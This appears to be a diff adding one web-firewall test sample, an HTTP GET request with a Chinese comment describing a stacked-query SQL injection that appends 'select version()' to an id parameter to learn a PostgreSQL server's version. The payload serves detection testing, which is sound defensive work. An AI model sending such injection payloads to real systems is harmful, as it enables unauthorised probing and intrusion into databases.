@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506338
+# 攻击者基于堆叠查询，将"select version()"语句注入到 SQL 查询参数中，利用version函数来获取PostgreSQL 版本信息。
+GET /?id=1%3Bselect%20version%28%29&bid=hd_tag_m8mv23zg HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23zg
+RM-PRO-Token: 67b98d5ba02647b3293208fc535b7afd
+RM-PRO-Time: 1742808355058
+User-Agent: curl/7.83.1
+
